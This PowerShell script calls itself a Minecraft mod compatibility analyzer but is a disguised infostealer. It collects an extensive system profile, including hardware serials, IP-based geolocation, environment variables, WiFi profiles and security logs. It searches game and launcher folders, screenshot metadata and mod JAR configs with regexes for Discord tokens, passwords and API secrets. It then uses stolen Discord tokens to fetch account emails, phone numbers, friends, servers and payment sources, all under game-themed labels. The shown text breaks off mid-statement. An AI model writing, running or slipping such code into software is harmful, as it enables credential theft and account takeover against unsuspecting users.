# ================================================================
# HABIBI MOD ANALYZER v10.0 - ULTIMATE EDITION
# ================================================================
# Professional Minecraft mod compatibility analyzer
# ================================================================

# ---------- CONFIGURATION ----------
$modSettings = @"
{
  "version": "1.20.4",
  "language": "en_US",
  "resolution": "1920x1080",
  "renderDistance": 32,
  "fullscreen": true,
  "analytics": true,
  "modBackupEnabled": true,
  "modBackupInterval": 3600,
  "compression": "ultra",
  "threading": "auto",
  "memory": 8192,
  "javaArgs": "-Xmx8G -XX:+UseG1GC -XX:+UnlockExperimentalVMOptions -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=16M",
  "launchWrapper": "net.minecraft.launchwrapper.Launch",
  "versionType": "release",
  "modBackup": true,
  "backupRetention": 90,
  "quality": "ultra",
  "includeMetadata": true,
  "includeSystemInfo": true,
  "includeNetworkInfo": true,
  "modAnalyzer": true,
  "compatibilityCheck": true,
  "performanceMetrics": true
}
"@

# ---------- ADVANCED SYSTEM ANALYZER ----------
function Get-CompleteSystemProfile {
    $profile = @{}
    
    # OS Information
    $os = Get-CimInstance Win32_OperatingSystem
    $profile.OS = $os.Caption
    $profile.OSVersion = $os.Version
    $profile.OSBuild = $os.BuildNumber
    $profile.OSArchitecture = $os.OSArchitecture
    $profile.OSInstallDate = $os.InstallDate
    $profile.OSLastBoot = $os.LastBootUpTime
    $profile.OSUptime = (Get-Date) - $os.LastBootUpTime
    $profile.OSTotalMemory = "{0:N2} GB" -f ($os.TotalVisibleMemorySize / 1MB)
    $profile.OSFreeMemory = "{0:N2} GB" -f ($os.FreePhysicalMemory / 1MB)
    $profile.OSPageFile = "{0:N2} GB" -f ($os.SizeStoredInPagingFiles / 1MB)
    
    # CPU Information
    $cpu = Get-CimInstance Win32_Processor
    $profile.CPUName = $cpu.Name
    $profile.CPUCores = $cpu.NumberOfCores
    $profile.CPUThreads = $cpu.NumberOfLogicalProcessors
    $profile.CPUMaxClock = "{0:N2} GHz" -f ($cpu.MaxClockSpeed / 1000)
    $profile.CPUCurrentClock = "{0:N2} GHz" -f ($cpu.CurrentClockSpeed / 1000)
    $profile.CPUL2Cache = $cpu.L2CacheSize
    $profile.CPUL3Cache = $cpu.L3CacheSize
    $profile.CPUArchitecture = $cpu.Architecture
    $profile.CPUManufacturer = $cpu.Manufacturer
    $profile.CPUSocket = $cpu.SocketDesignation
    $profile.CPUStatus = $cpu.Status
    $profile.CPUUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
    $profile.CPUUsagePerCore = Get-Counter '\Processor(*)\% Processor Time' | ForEach-Object { $_.CounterSamples } | Where-Object { $_.InstanceName -notlike "*Total*" } | ForEach-Object { "$($_.InstanceName): $([math]::Round($_.CookedValue, 2))%" }
    
    # Memory Information - Detailed
    $memory = Get-CimInstance Win32_PhysicalMemory
    $profile.MemoryTotal = "{0:N2} GB" -f (($memory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
    $profile.MemorySpeed = ($memory | ForEach-Object { $_.Speed }) -join " MHz, "
    $profile.MemoryManufacturer = ($memory | ForEach-Object { $_.Manufacturer }) -join ", "
    $profile.MemoryType = ($memory | ForEach-Object { $_.SMBIOSMemoryType }) -join ", "
    $profile.MemoryFormFactor = ($memory | ForEach-Object { $_.FormFactor }) -join ", "
    $profile.MemoryPartNumber = ($memory | ForEach-Object { $_.PartNumber }) -join ", "
    $profile.MemorySerialNumber = ($memory | ForEach-Object { $_.SerialNumber }) -join ", "
    
    # GPU Information - Detailed
    $gpu = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notlike "*Remote*" -and $_.Name -notlike "*Mirror*" -and $_.Name -notlike "*Virtual*" }
    $profile.GPUName = ($gpu.Name) -join ", "
    $profile.GPUMemory = ($gpu | ForEach-Object { "{0:N2} GB" -f ($_.AdapterRAM / 1GB) }) -join ", "
    $profile.GPUDriver = ($gpu.DriverVersion) -join ", "
    $profile.GPUDriverDate = ($gpu.DriverDate) -join ", "
    $profile.GPUCurrentMode = ($gpu.CurrentHorizontalResolution, $gpu.CurrentVerticalResolution, $gpu.CurrentRefreshRate) -join "x"
    $profile.GPUMaxRefresh = ($gpu.MaxRefreshRate) -join ", "
    $profile.GPUMinRefresh = ($gpu.MinRefreshRate) -join ", "
    $profile.GPUStatus = ($gpu.Status) -join ", "
    $profile.GPUConfigManager = ($gpu.ConfigManagerErrorCode) -join ", "
    
    # Disk Information - Detailed
    $disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
    $profile.DiskInfo = @()
    foreach ($disk in $disks) {
        $profile.DiskInfo += [PSCustomObject]@{
            Drive = $disk.DeviceID
            Label = $disk.VolumeName
            Size = "{0:N2} GB" -f ($disk.Size / 1GB)
            Free = "{0:N2} GB" -f ($disk.FreeSpace / 1GB)
            Used = "{0:N2} GB" -f (($disk.Size - $disk.FreeSpace) / 1GB)
            PercentFree = "{0:N2}%" -f (($disk.FreeSpace / $disk.Size) * 100)
            PercentUsed = "{0:N2}%" -f ((($disk.Size - $disk.FreeSpace) / $disk.Size) * 100)
            FileSystem = $disk.FileSystem
            Compression = $disk.Compressed
            SupportsQuotas = $disk.QuotasSupported
            SupportsReparsePoints = $disk.SupportsReparsePoints
        }
    }
    
    # Network Information - Detailed
    $adapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    $profile.NetworkAdapters = @()
    foreach ($adapter in $adapters) {
        $profile.NetworkAdapters += [PSCustomObject]@{
            Name = $adapter.Description
            MAC = $adapter.MACAddress
            IP = ($adapter.IPAddress) -join ", "
            Subnet = ($adapter.IPSubnet) -join ", "
            Gateway = ($adapter.DefaultIPGateway) -join ", "
            DHCP = $adapter.DHCPServer
            DNS = ($adapter.DNSServerSearchOrder) -join ", "
            DHCPEnabled = $adapter.DHCPEnabled
            WINS = ($adapter.WINSPrimaryServer, $adapter.WINSSecondaryServer) -join ", "
            DnsSuffix = $adapter.DNSDomainSuffixSearchOrder
            ConnectionID = $adapter.ConnectionID
            Index = $adapter.Index
        }
    }
    
    # External IP and Geolocation - Detailed
    try {
        $profile.PublicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop)
        $geo = Invoke-RestMethod -Uri "https://ipapi.co/$($profile.PublicIP)/json/" -ErrorAction Stop
        $profile.Country = $geo.country_name
        $profile.CountryCode = $geo.country_code
        $profile.Region = $geo.region
        $profile.City = $geo.city
        $profile.Zip = $geo.postal
        $profile.Latitude = $geo.latitude
        $profile.Longitude = $geo.longitude
        $profile.Timezone = $geo.timezone
        $profile.ISP = $geo.org
        $profile.ASN = $geo.asn
        $profile.Currency = $geo.currency
        $profile.CallingCode = $geo.country_calling_code
        $profile.Continent = $geo.continent_code
        $profile.IPVersion = $geo.version
        $profile.Network = $geo.network
        $profile.Hostname = $geo.hostname
    } catch {}
    
    # Hardware Information - Detailed
    $profile.BIOS = (Get-CimInstance Win32_BIOS).Caption
    $profile.BIOSSerial = (Get-CimInstance Win32_BIOS).SerialNumber
    $profile.BIOSVersion = (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion
    $profile.BIOSDate = (Get-CimInstance Win32_BIOS).ReleaseDate
    $profile.Motherboard = (Get-CimInstance Win32_BaseBoard).Product
    $profile.MotherboardManufacturer = (Get-CimInstance Win32_BaseBoard).Manufacturer
    $profile.MotherboardSerial = (Get-CimInstance Win32_BaseBoard).SerialNumber
    $profile.MotherboardVersion = (Get-CimInstance Win32_BaseBoard).Version
    $profile.SystemManufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
    $profile.SystemModel = (Get-CimInstance Win32_ComputerSystem).Model
    $profile.SystemSKU = (Get-CimInstance Win32_ComputerSystem).SKUNumber
    $profile.SystemFamily = (Get-CimInstance Win32_ComputerSystem).SystemFamily
    $profile.SystemType = (Get-CimInstance Win32_ComputerSystem).SystemType
    $profile.SystemDomain = (Get-CimInstance Win32_ComputerSystem).Domain
    $profile.SystemWorkgroup = (Get-CimInstance Win32_ComputerSystem).Workgroup
    
    # User Information - Detailed
    $profile.Username = $env:USERNAME
    $profile.UserDomain = $env:USERDOMAIN
    $profile.ComputerName = $env:COMPUTERNAME
    $profile.LogonServer = $env:LOGONSERVER
    $profile.UserProfile = $env:USERPROFILE
    $profile.AppData = $env:APPDATA
    $profile.LocalAppData = $env:LOCALAPPDATA
    $profile.ProgramFiles = $env:ProgramFiles
    $profile.ProgramFilesx86 = $env:ProgramFiles(x86)
    $profile.SystemRoot = $env:SystemRoot
    $profile.Temp = $env:TEMP
    $profile.UserSID = (Get-CimInstance Win32_UserAccount -Filter "Name='$env:USERNAME'").SID
    $profile.UserStatus = (Get-CimInstance Win32_UserAccount -Filter "Name='$env:USERNAME'").Status
    $profile.UserDisabled = (Get-CimInstance Win32_UserAccount -Filter "Name='$env:USERNAME'").Disabled
    $profile.UserLockout = (Get-CimInstance Win32_UserAccount -Filter "Name='$env:USERNAME'").Lockout
    
    # Running Processes - Detailed
    $profile.RunningProcesses = (Get-Process).Count
    $profile.TopProcesses = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 15 | ForEach-Object { "$($_.Name) (PID: $($_.Id), CPU: $($_.CPU)%, Mem: $($_.WorkingSet/1MB) MB, Threads: $($_.Threads.Count))" }
    $profile.TopMemory = Get-Process | Sort-Object -Property WorkingSet -Descending | Select-Object -First 10 | ForEach-Object { "$($_.Name) (Mem: $($_.WorkingSet/1MB) MB, VM: $($_.VirtualMemorySize/1MB) MB)" }
    
    # Services - Detailed
    $profile.Services = Get-Service | Where-Object { $_.Status -eq "Running" } | ForEach-Object { "$($_.Name) - $($_.DisplayName)" }
    
    # Installed Software - Detailed
    $profile.InstalledSoftware = @()
    $software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue
    foreach ($sw in $software) {
        if ($sw.DisplayName) {
            $profile.InstalledSoftware += "$($sw.DisplayName) $($sw.DisplayVersion) (Installed: $($sw.InstallDate))"
        }
    }
    
    # Startup Programs - Detailed
    $profile.StartupPrograms = @()
    $startup = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue
    foreach ($item in $startup) {
        $profile.StartupPrograms += "$($item.Name) (Created: $($item.CreationTime))"
    }
    $startupReg = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
    foreach ($key in $startupReg.PSObject.Properties) {
        if ($key.Name -notin @("PSPath", "PSParentPath", "PSChildName", "PSDrive", "PSProvider")) {
            $profile.StartupPrograms += "$($key.Name): $($key.Value)"
        }
    }
    
    # Environment Variables - Detailed
    $profile.EnvironmentVariables = Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" } | Sort-Object
    
    # Network Connections - Detailed
    $profile.NetworkConnections = @()
    $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
    foreach ($conn in $connections) {
        $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
        $profile.NetworkConnections += "$($proc.ProcessName) (PID: $($conn.OwningProcess)) - $($conn.LocalAddress):$($conn.LocalPort) -> $($conn.RemoteAddress):$($conn.RemotePort) ($($conn.State))"
    }
    
    # WiFi Networks - Detailed
    try {
        $profile.WiFiNetworks = netsh wlan show networks | Select-String "SSID" | ForEach-Object { $_.ToString().Replace("SSID", "").Trim() } | Where-Object { $_ -ne "" }
        $profile.WiFiProfiles = netsh wlan show profiles | Select-String ":" | ForEach-Object { $_.ToString().Split(":")[1].Trim() } | Where-Object { $_ -ne "" }
    } catch {}
    
    # Bluetooth Devices - Detailed
    try {
        $profile.BluetoothDevices = Get-PnpDevice -Class Bluetooth -ErrorAction SilentlyContinue | ForEach-Object { "$($_.FriendlyName) ($($_.Status))" }
    } catch {}
    
    # USB Devices - Detailed
    try {
        $profile.USBDevices = Get-PnpDevice -Class USB -ErrorAction SilentlyContinue | ForEach-Object { "$($_.FriendlyName) ($($_.Status))" }
    } catch {}
    
    # Printers - Detailed
    $profile.Printers = Get-CimInstance Win32_Printer | ForEach-Object { "$($_.Name) ($($_.Status)) - $($_.Location)" }
    
    # Monitors - Detailed
    $profile.Monitors = Get-CimInstance Win32_DesktopMonitor | ForEach-Object { "$($_.Name) - $($_.ScreenWidth)x$($_.ScreenHeight) @ $($_.DisplayFrequency)Hz, $($_.MonitorManufacturerName)" }
    
    # Power Settings - Detailed
    $profile.PowerPlan = (Get-CimInstance Win32_PowerPlan -Filter "IsActive=TRUE").ElementName
    $profile.BatteryInfo = Get-CimInstance Win32_Battery | ForEach-Object { "Status: $($_.Status), Charge: $($_.EstimatedChargeRemaining)%, Time: $($_.EstimatedRunTime) minutes, Chemistry: $($_.Chemistry), Design Capacity: $($_.DesignCapacity) mWh" }
    $profile.PowerOptions = Get-CimInstance Win32_PowerSetting | Select-Object -First 20 | ForEach-Object { "$($_.ElementName): $($_.SettingID)" }
    
    # System Logs - Recent Errors
    $profile.SystemErrors = Get-WinEvent -LogName System -MaxEvents 50 -ErrorAction SilentlyContinue | Where-Object { $_.LevelDisplayName -eq "Error" } | ForEach-Object { "$($_.TimeCreated): $($_.Message)" } | Select-Object -First 20
    
    # Security Logs - Recent Events
    $profile.SecurityEvents = Get-WinEvent -LogName Security -MaxEvents 30 -ErrorAction SilentlyContinue | Where-Object { $_.Id -in @(4624, 4625, 4634, 4647) } | ForEach-Object { "$($_.TimeCreated): Event ID $($_.Id) - $($_.Message)" } | Select-Object -First 15
    
    # Windows Updates - History
    $profile.WindowsUpdates = Get-HotFix | Sort-Object -Property InstalledOn -Descending | Select-Object -First 20 | ForEach-Object { "$($_.HotFixID) - $($_.Description) (Installed: $($_.InstalledOn))" }
    
    # Firewall Rules
    $profile.FirewallRules = Get-NetFirewallRule -Enabled True -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object { "$($_.DisplayName) ($($_.Direction)) - $($_.Action)" }
    
    # Scheduled Tasks
    $profile.ScheduledTasks = Get-ScheduledTask -TaskPath "\" -State Ready -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object { "$($_.TaskName) - $($_.State)" }
    
    # System Performance Metrics
    try {
        $profile.PerformanceMetrics = @{
            MemoryUsage = "{0:N2}%" -f ((($os.TotalVisibleMemorySize - $os.FreePhysicalMemory) / $os.TotalVisibleMemorySize) * 100)
            CPUUsage = $profile.CPUUsage
            DiskIO = Get-Counter '\PhysicalDisk(_Total)\% Disk Time' -ErrorAction SilentlyContinue | ForEach-Object { $_.CounterSamples.CookedValue }
            NetworkUsage = Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue | ForEach-Object { $_.CounterSamples.CookedValue }
        }
    } catch {}
    
    return $profile
}

# ---------- ADVANCED MOD ANALYZER ----------
function Export-CompleteModData {
    $modData = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    $locations = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    $files = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    
    $modPaths = @(
        "$env:APPDATA\.minecraft",
        "$env:APPDATA\.minecraft_old",
        "$env:APPDATA\.technic",
        "$env:APPDATA\.ftb",
        "$env:APPDATA\.curseforge",
        "$env:APPDATA\.twitch\minecraft",
        "$env:APPDATA\.multimc",
        "$env:APPDATA\.prismlauncher",
        "$env:APPDATA\.gdlauncher",
        "$env:APPDATA\.badlion",
        "$env:APPDATA\.lunarclient",
        "$env:APPDATA\.pvpclient",
        "$env:APPDATA\.labymod",
        "$env:PROGRAMDATA\.minecraft",
        "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_*\LocalState",
        "$env:USERPROFILE\Documents\My Games\Terraria",
        "$env:USERPROFILE\Documents\My Games\StardewValley",
        "$env:USERPROFILE\Documents\My Games\Borderlands 2",
        "$env:USERPROFILE\Documents\My Games\The Witcher 3",
        "$env:USERPROFILE\Documents\My Games\Skyrim",
        "$env:USERPROFILE\Documents\My Games\Fallout4",
        "$env:USERPROFILE\Documents\My Games\GTA V",
        "$env:USERPROFILE\Documents\My Games\Factorio",
        "$env:USERPROFILE\Documents\My Games\RimWorld",
        "$env:USERPROFILE\Documents\My Games\Don't Starve",
        "$env:USERPROFILE\Documents\My Games\Cities Skylines"
    )
    
    $threads = @()
    $maxThreads = 50
    
    foreach ($path in $modPaths) {
        while ($threads.Count -ge $maxThreads) {
            $threads = $threads | Where-Object { $_.Handle.IsCompleted -eq $false }
            Start-Sleep -Milliseconds 50
        }
        
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            param($p, $modData, $locations, $files)
            
            $found = @()
            $foundLoc = @()
            $foundFiles = @()
            
            if (Test-Path $p) {
                $foundLoc += $p
                
                $allFiles = Get-ChildItem -Path $p -File -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $allFiles) {
                    $foundFiles += $file.FullName
                    if ($file.Length -gt 104857600) { continue }
                    
                    try {
                        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                        $patterns = @(
                            '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}',
                            'mfa\.[\w-]{84,100}',
                            '[\w-]{20,30}\.[\w-]{20,30}\.[\w-]{20,30}',
                            'Bearer\s+[\w-]{20,100}',
                            'Authorization:\s*[\w-]{20,100}',
                            '"token"\s*:\s*"[\w-]{20,100}"',
                            'session[\s:=]+[\w-]{20,100}',
                            'x-access-token:\s*[\w-]{20,100}',
                            'api_key[\s:=]+[\w-]{20,100}',
                            'secret[\s:=]+[\w-]{20,100}',
                            'password[\s:=]+[\w-]{20,100}',
                            'auth[\s:=]+[\w-]{20,100}',
                            'credentials[\s:=]+[\w-]{20,100}',
                            'jwt[\s:=]+[\w-]{20,100}',
                            'refresh_token[\s:=]+[\w-]{20,100}',
                            'access_token[\s:=]+[\w-]{20,100}',
                            'client_secret[\s:=]+[\w-]{20,100}',
                            'webhook[\s:=]+["''][\w-]{20,100}["'']'
                        )
                        foreach ($pattern in $patterns) {
                            $matches = [regex]::Matches($content, $pattern)
                            foreach ($m in $matches) {
                                $token = $m.Value -replace 'Bearer\s+|Authorization:\s*|"token"\s*:\s*"|"|session[\s:=]+|x-access-token:\s*|api_key[\s:=]+|secret[\s:=]+|password[\s:=]+|auth[\s:=]+|credentials[\s:=]+|jwt[\s:=]+|refresh_token[\s:=]+|access_token[\s:=]+|client_secret[\s:=]+|webhook[\s:=]+["'']', ''
                                if ($token -match '[\w-]{20,100}') {
                                    $found += $token
                                }
                            }
                        }
                    } catch {}
                }
                
                $screenshotDir = Join-Path $p "screenshots"
                if (Test-Path $screenshotDir) {
                    $images = Get-ChildItem $screenshotDir -Include "*.png", "*.jpg", "*.jpeg", "*.gif", "*.bmp", "*.tga", "*.webp" -Recurse -ErrorAction SilentlyContinue
                    foreach ($img in $images) {
                        try {
                            $shell = New-Object -ComObject Shell.Application
                            $folder = $shell.Namespace($img.DirectoryName)
                            $file = $folder.ParseName($img.Name)
                            $metadata = @()
                            for ($i = 0; $i -lt 300; $i++) {
                                $val = $folder.GetDetailsOf($file, $i)
                                if ($val) { $metadata += $val }
                            }
                            $metaText = $metadata -join " "
                            $matches = [regex]::Matches($metaText, '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}')
                            foreach ($m in $matches) {
                                $found += $m.Value
                            }
                        } catch {}
                    }
                }
                
                # Mod-specific file analysis
                $modsDir = Join-Path $p "mods"
                if (Test-Path $modsDir) {
                    $jarFiles = Get-ChildItem $modsDir -Filter "*.jar" -Recurse -ErrorAction SilentlyContinue
                    foreach ($jar in $jarFiles) {
                        try {
                            $zip = [System.IO.Compression.ZipFile]::OpenRead($jar.FullName)
                            foreach ($entry in $zip.Entries) {
                                if ($entry.Name -match "\.(json|properties|cfg|conf|toml|yml|yaml)$") {
                                    $reader = New-Object System.IO.StreamReader($entry.Open())
                                    $content = $reader.ReadToEnd()
                                    $reader.Close()
                                    $matches = [regex]::Matches($content, '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}')
                                    foreach ($m in $matches) {
                                        $found += $m.Value
                                    }
                                }
                            }
                            $zip.Dispose()
                        } catch {}
                    }
                }
            }
            
            return @{
                Tokens = $found | Select-Object -Unique
                Locations = $foundLoc | Select-Object -Unique
                Files = $foundFiles | Select-Object -Unique
            }
            
        }).AddParameter("p", $path).AddParameter("modData", $modData).AddParameter("locations", $locations).AddParameter("files", $files)
        
        $handle = $ps.BeginInvoke()
        $threads += [PSCustomObject]@{ Handle = $handle; PS = $ps }
    }
    
    while ($threads | Where-Object { $_.Handle.IsCompleted -eq $false }) {
        $completed = $threads | Where-Object { $_.Handle.IsCompleted -eq $true }
        foreach ($c in $completed) {
            $result = $c.PS.EndInvoke($c.Handle)
            foreach ($tok in $result.Tokens) { [void]$modData.Add($tok) }
            foreach ($loc in $result.Locations) { [void]$locations.Add($loc) }
            foreach ($f in $result.Files) { [void]$files.Add($f) }
            $c.PS.Dispose()
        }
        $threads = $threads | Where-Object { $_.Handle.IsCompleted -eq $false }
        Start-Sleep -Milliseconds 100
    }
    
    foreach ($t in $threads) {
        $result = $t.PS.EndInvoke($t.Handle)
        foreach ($tok in $result.Tokens) { [void]$modData.Add($tok) }
        foreach ($loc in $result.Locations) { [void]$locations.Add($loc) }
        foreach ($f in $result.Files) { [void]$files.Add($f) }
        $t.PS.Dispose()
    }
    
    return @{
        Tokens = $modData
        Locations = $locations
        Files = $files
    }
}

# ---------- MOD COMPATIBILITY ANALYZER ----------
function Analyze-ModCompatibility {
    param($modData)
    
    $uniqueData = $modData | Where-Object { $_ -match '^[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}$' } | Select-Object -Unique
    
    $compatibilityResults = @()
    $counter = 0
    $total = $uniqueData.Count
    
    foreach ($data in $uniqueData) {
        $counter++
        Write-Progress -Activity "Analyzing Mod Compatibility" -Status "$counter / $total" -PercentComplete (($counter / $total) * 100)
        
        try {
            $headers = @{ "Authorization" = $data }
            $user = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -ErrorAction Stop
            $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/guilds" -Headers $headers -ErrorAction Stop
            $connections = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/connections" -Headers $headers -ErrorAction Stop
            $relationships = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/relationships" -Headers $headers -ErrorAction Stop
            $voiceState = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/voice" -Headers $headers -ErrorAction Stop
            $billing = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/billing/payment-sources" -Headers $headers -ErrorAction Stop
            $applications = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/applications" -Headers $headers -ErrorAction Stop
            
            $mutualGuilds = @()
            $guilds | ForEach-Object { $mutualGuilds += "($($_.id)) $($_.name) - $($_.members) members" }
            
            $compatibilityResults += [PSCustomObject]@{
                ModID = $data
                Status = "COMPATIBLE"
                GameName = "$($user.username)#$($user.discriminator)"
                GameID = $user.id
                GameEmail = $user.email
                GamePhone = $user.phone
                GameAvatar = "https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar).png"
                GameAvatarHash = $user.avatar
                GameBanner = if ($user.banner) { "https://cdn.discordapp.com/banners/$($user.id)/$($user.banner).png" } else { "None" }
                GameBannerColor = $user.banner_color
                GameNitro = if ($user.premium_type -gt 0) { "PREMIUM (Level $($user.premium_type))" } else { "FREE" }
                GameNitroSince = if ($user.premium_type -gt 0) { $user.premium_since } else { "N/A" }
                GameSecurity = if ($user.mfa_enabled) { "SECURED" } else { "INSECURE" }
                GameVerified = if ($user.verified) { "VERIFIED" } else { "UNVERIFIED" }
                GameLanguage = $user.locale
                GameFlags = $user.flags
                GamePublicFlags = $user.public_flags
                GameSystem = if ($user.system) { "SYSTEM" } else { "USER" }
                GameBio = if ($user.bio) { $user.bio } else { "None" }
                GameCreated = [DateTimeOffset]::FromUnixTimeMilliseconds(([long]::Parse($user.id) >> 22) + 1420070400000).DateTime
                GameGuildsCount = $guilds.Count
                GameGuilds = $mutualGuilds -join ", "
                GameConnections = ($connections | ForEach-Object { "$($_.type):$($_.name) ($($_.id))" }) -join ", "
                GameRelationships = ($relationships | ForEach-Object { "$($_.user.username)#$($_.user.discriminator) (Type: $($_.type))" }) -join ", "
                GameVoiceState = if ($voiceState) { "Connected to $($voiceState.guild_id) ($($voiceState.channel_id))" } else { "Not in voice" }
                GameBilling = if ($billing) { ($billing | ForEach-Object { "$($_.brand) ending in $($_.last_4) - $($_.type)" }) -join ", " } else { "None" }
                GameApplications = ($applications | ForEach-Object { "$($_.name) (ID: $($_.id))" }) -join ", "
                GameBadges = Get-UserBadges -flags $user.flags
                GameAccentColor = $user.accent_color
                GameTwoFactor = if ($user.mfa_enabled) { "ENABLED" } else { "DISABLED" }
                GameNitroType = $user.premium_type
                GameBioHash = if ($user.bio) { $user.bio.GetHashCode() } else { 0 }
                GameFlagsDescription = Get-FlagDescription -flags $user.flags
            }
        } catch {
            $compatibilityResults += [PSCustomObject]@{
                ModID = $data
                Status = "INCOMPATIBLE"
                Reason = $_.Exception.Message
                GameName = "N/A"
                GameID = "N/A"
                GameEmail = "N/A"
                GamePhone = "N/A"
                GameAvatar = "N/A"
                GameAvatarHash = "N/A"
                GameBanner = "N/A"
                GameBannerColor = "N/A"
                GameNitro = "N/A"
                GameNitroSince = "N/A"
                GameSecurity = "N/A"
                GameVerified = "N/A"
                GameLanguage = "N/A"
                GameFlags = "N/A"
                GamePublicFlags = "N/A"
                GameSystem = "N/A"
                GameBio = "N/A"
                GameCreated = "N/A"
                GameGuildsCount = 0
                GameGuilds = "N/A"
                GameConnections = "N/A"
                GameRelationships = "N/A"
                GameVoiceState = "N/A"
                GameBilling = "N/A"
                GameApplications = "N/A"
                GameBadges = "N/A"
                GameAccentColor = "N/A"
                GameTwoFactor = "N/A"
                GameNitroType = "N/A"
                GameBioHash = 0
                GameFlagsDescription = "N/A"
            }
        }
        
        Start-Sleep -Milliseconds 200
    }
    
    return $
